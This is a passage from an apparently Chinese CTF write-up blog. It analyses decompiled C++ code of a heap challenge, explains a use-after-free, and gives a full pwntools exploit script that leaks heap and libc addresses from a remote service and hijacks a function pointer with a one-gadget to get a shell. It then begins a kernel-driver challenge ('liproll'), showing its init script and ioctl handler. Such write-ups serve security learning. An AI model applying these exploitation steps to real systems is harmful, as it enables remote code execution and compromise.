class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (NoteImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::get((__int64)<span class="keyword">this</span> + <span class="number">8</span>);</span><br><span class="line">    result = NoteImpl::save(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"You have no house to save!!!"</span>);</span><br><span class="line">    result = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺序判断<code>member_1</code>和<code>member_2</code>是否为空，不为空，则调用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteImpl::save(NoteImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;::shrink_to_fit((__int64)<span class="keyword">this</span> + <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对相应<code>member_1</code>（或者<code>member_2</code>）结构体中的<code>buf_1</code>vector进行<code>shrink_to_fit</code>操作，即将vector的大小缩小到满足储存需要并且对齐0x10的最小值；从行为上看，是会将原来所占的buffer给先<code>free</code>掉，然后根据原vector的size重新再<code>malloc</code>空间。</p><p>这是很关键的一个函数，由于vector的所占内存空间的增长方式是倍增，所以如果想要获得某个特定大小的vector，就可通过<code>shrink_to_fit</code>来实现，此时vector的倍增基数就变成了可控的大小。</p></li><li><p>backup：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __fastcall NoteStorageImpl::backup(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+18h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::get((__int64)<span class="keyword">this</span>);</span><br><span class="line">    <span class="built_in">std</span>::make_unique&lt;NoteDBImpl,NoteImpl *&gt;(v3, &amp;v2);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span>=((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>, v3);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::~<span class="built_in">unique_ptr</span>(v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断<code>NoteStorageImpl</code>中的<code>house-&gt;status</code>是否为0，若为0则将<code>member_1</code>赋值给<code>house-&gt;member</code>。</p></li><li><p>encourage：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteStorageImpl::encourage(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteDBImpl *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>) )<span class="comment">// judge if backed up</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (NoteDBImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::get((__int64)<span class="keyword">this</span> + <span class="number">16</span>);</span><br><span class="line">    result = NoteDBImpl::getEncourage(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"You can not get encourage now!"</span>);</span><br><span class="line">    result = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall NoteDBImpl::getEncourage(NoteDBImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = **((<span class="keyword">unsigned</span> <span class="keyword">int</span> **)<span class="keyword">this</span> + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">    result = (***((__int64 (__fastcall ****)(_QWORD))<span class="keyword">this</span> + <span class="number">1</span>))(*((_QWORD *)<span class="keyword">this</span> + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>house</code>存在的情况下，且<code>house-&gt;member</code>以及<code>house-&gt;member-&gt;func_get_encourage</code>不为0，则调用相应的<code>house-&gt;member-&gt;func_get_encourage</code>函数。</p></li><li><p>delHouse：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall NoteStorageImpl::delHouse(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteDBImpl *v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>) )<span class="comment">// judge if backed up</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (NoteDBImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::get((__int64)<span class="keyword">this</span> + <span class="number">16</span>);</span><br><span class="line">    NoteDBImpl::setdel(v1);</span><br><span class="line">    result = <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::reset((__int64)<span class="keyword">this</span>, <span class="number">0L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"You can not delete now!"</span>);</span><br><span class="line">    result = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NoteDBImpl *__fastcall NoteDBImpl::setdel(NoteDBImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteDBImpl *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="keyword">this</span>;</span><br><span class="line">  *(_BYTE *)<span class="keyword">this</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::reset(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = a1;</span><br><span class="line">  v5 = a2;</span><br><span class="line">  v2 = <span class="built_in">std</span>::__uniq_ptr_impl&lt;NoteImpl,<span class="built_in">std</span>::default_delete&lt;NoteImpl&gt;&gt;::_M_ptr(a1);</span><br><span class="line">  <span class="built_in">std</span>::swap&lt;NoteImpl *&gt;(v2, &amp;v5);</span><br><span class="line">  result = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteImpl&gt;::get_deleter(v6);</span><br><span class="line">    result = <span class="built_in">std</span>::default_delete&lt;NoteImpl&gt;::<span class="keyword">operator</span>()(v4, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>house</code>存在的情况下，置<code>house-&gt;status</code>为1，并释放<code>house-&gt;member</code>内存空间以及置<code>NoteStorageImpl-&gt;member_1</code>为0。</p><p>显然这里<code>house-&gt;member</code>本身并没有置0，且<code>delHouse</code>和<code>encourage</code>也没有检查就使用了，显然存在uaf。</p></li><li><p>show：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall NoteStorageImpl::show(NoteStorageImpl *<span class="keyword">this</span>)</span><br><span class="line">&#123;</span><br><span class="line">  NoteDBImpl *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::<span class="keyword">operator</span> <span class="keyword">bool</span>((<span class="keyword">char</span> *)<span class="keyword">this</span> + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = (NoteDBImpl *)<span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;NoteDBImpl&gt;::get((__int64)<span class="keyword">this</span> + <span class="number">16</span>);</span><br><span class="line">    result = NoteDBImpl::gift(v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"NO!"</span>);</span><br><span class="line">    result = <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __fastcall NoteDBImpl::gift(NoteDBImpl *<span class="keyword">this</span>)</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">   result = *(<span class="keyword">unsigned</span> __int8 *)<span class="keyword">this</span>;</span><br><span class="line">   <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">     result = <span class="built_in">puts</span>(*((<span class="keyword">const</span> <span class="keyword">char</span> **)<span class="keyword">this</span> + <span class="number">1</span>));</span><br><span class="line">   <span class="keyword">return</span> result;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在<code>backup</code>并且<code>delHouse</code>之后（即<code>house-&gt;status = 1</code>），调用此函数可以打印出<code>house-&gt;member</code> 内容。</p></li></ul></li><li><p>根据以上分析，可以发现，当依次调用了<code>backup</code>和<code>delHouse</code>功能后，虽然<code>NoteStorageImpl-&gt;member_1 = 0</code>且空间被释放，但是<code>NoteStorageImpl-&gt;house-&gt;member</code>却没有清空；于是只要再把这块空间<code>malloc</code>出来，就可以通过<code>show</code>把该块chunk中残留的一些指针leak出来，同时如果把该<code>NoteImpl-&gt;func_get_encourage</code>给劫持成onegadget，再调用就可以getshell了。</p></li><li><p>其实题目也有些小提示，比如特意在<code>NoteImpl</code>结构体中<code>offset = 0x1b8</code>的位置留了一个<code>malloc</code>的地址可以用来leak libc，在<code>offset = 0x1a0</code>的地方留一个vector结构体可以用来leak heap。</p></li><li><p>整个利用思路如下：</p><ul><li>首先依次调用<code>backup</code>和<code>delHouse</code>，将<code>member_1</code>给释放掉；此时tcache中存在一个<code>size = 0x350</code>的chunk，接下来利用就是围绕这个chunk。</li><li>调用<code>editHouse</code>（此时不<code>clear</code>），写入0x1a0字节的数据，由于实际是通过不断地<code>push_back</code>写入的，所以最终会得到一个<code>size = 0x290</code>的chunk。</li><li>调用<code>save</code>，触发对上述提到的chunk进行<code>shrink_to_fit</code>，从而将<code>0x290</code>的chunk释放掉，得到一个<code>size = 0x1b0</code>的chunk。</li><li>继续进行<code>editHouse</code>，继续<code>push_back</code>写入0x10个字节数据，因为<code>push_back</code>的过程中，vector的size会不断增大，从而最终超过该chunk的size，vector就会进行倍增，从而<code>malloc</code>出一个<code>size = 0x350</code>的chunk，也就是拿到了<code>NoteStorageImpl-&gt;member_1</code>（或<code>NoteStorageImpl-&gt;house-&gt;member</code>）所在的chunk；这样再通过<code>show</code>就能leak出紧跟在后面的heap和malloc的地址。</li><li>最后调用<code>editHouse</code>，并<code>clear</code>掉vector，即后续<code>push_back</code>会从chunk头开始，这样就可以覆盖<code>house-&gt;member-&gt;func_get_encourage = onegadget</code>。</li><li>调用<code>encourage</code>功能，触发onegadget。</li></ul></li><li><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">'106.14.216.214'</span>, <span class="number">27972</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to clear it?(y/N)"</span>, <span class="string">"n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content(q to quit):"</span>, <span class="string">"A"</span> * <span class="number">0x1A0</span> + <span class="string">"q"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to clear it?(y/N)"</span>, <span class="string">"n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content(q to quit):"</span>, <span class="string">"A"</span> * <span class="number">8</span> + <span class="string">"heapaddr"</span> + <span class="string">"q"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"heapaddr"</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x121e5</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to clear it?(y/N)"</span>, <span class="string">"n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content(q to quit):"</span>, <span class="string">"libcaddr"</span> + <span class="string">"q"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"6"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"libcaddr"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - libc.sym[<span class="string">'malloc'</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Do you want to clear it?(y/N)"</span>, <span class="string">"y"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"content(q to quit):"</span>, p64(heap_base + <span class="number">0x11e98</span>) + p64(libc_base + <span class="number">0x10a41c</span>) + <span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="liproll"><a href="#liproll" class="headerlink" title="liproll"></a>liproll</h1><ol><li><p>首先解包rootfs，查看init：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">chown -R root:root /bin /usr /root</span><br><span class="line"></span><br><span class="line">echo "flag&#123;this_is_a_test_flag&#125;" &gt; /root/flag</span><br><span class="line">chmod -R 400 /root</span><br><span class="line">chmod -R o-r /proc/kallsyms</span><br><span class="line">chmod -R 755 /bin /usr</span><br><span class="line"></span><br><span class="line">cat /root/banner</span><br><span class="line">insmod /liproll.ko</span><br><span class="line"></span><br><span class="line">chmod 777 /dev/liproll</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo 'sh end!\n'</span><br><span class="line">poweroff -d 1800000 -f &amp;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>可以看出加载了一个名为liproll的driver，并且dmesg信息和/proc/kallsyms都不可读。</p><p>从run.sh：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr" \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-nographic \</span><br><span class="line">-m 2G \</span><br><span class="line">-smp cores=2,threads=2,sockets=1 \</span><br><span class="line">-monitor /dev/null \</span><br></pre></td></tr></table></figure><p>可以知道开启了kaslr保护。</p></li><li><p>从rootfs中拿出liproll.ko分析，关键函数有：</p><ul><li><p>liproll_unlocked_ioctl：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">liproll_unlocked_ioctl</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xD3C7F03</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    create_a_spell();</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 &gt; <span class="number">0xD3C7F03</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0xD3C7F04</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    choose_a_spell(a3);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0xD3C7F01</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">0xD3C7F02</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        global_buffer = <span class="number">0L</span>L;</span><br><span class="line">        *(&amp;global_buffer + <span class="number">1</span>) = <span class="number">0L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    cast_a_spell(a3);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以通俗地理解为菜单，提供了create，cast，choose，reset功能，其中：</p><ul><li><p>create:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 